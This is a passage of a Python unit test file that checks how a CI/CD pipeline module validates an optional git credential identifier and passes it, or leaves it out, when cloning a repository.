                                      "branch": "main", "credential_id": "gh-token"}, partial=False)
        self.assertEqual(out["credential_id"], "gh-token")

    def test_credential_id_defaults_empty_for_public_repos(self):
        out = cicd._validate_fields({"app_slug": "demo", "repo_url": "https://example.com/a.git",
                                      "branch": "main"}, partial=False)
        self.assertEqual(out["credential_id"], "")

    def test_overlong_credential_id_rejected(self):
        with self.assertRaises(cicd.PipelineError):
            cicd._validate_fields({"app_slug": "demo", "repo_url": "https://example.com/a.git",
                                    "branch": "main", "credential_id": "x" * 200}, partial=False)

    def test_credential_reaches_git_source(self):
        seen = {}
        with mock.patch.object(cicd, "_git_source_module", return_value=self._fake_module(seen)):
            cicd.git_clone_or_update("https://example.com/a.git", "main", credential_id="gh-token")
        self.assertEqual(seen.get("credential_id_value"), "gh-token")

    def test_public_repo_sends_no_credential_key(self):
        seen = {}
        with mock.patch.object(cicd, "_git_source_module", return_value=self._fake_module(seen)):
            cicd.git_clone_or_update("https://example.com/a.git", "main")
        self.assertNotIn("credential_id_value", seen)

if __name__ == "__main__":
    unittest.main(verbosity=2)
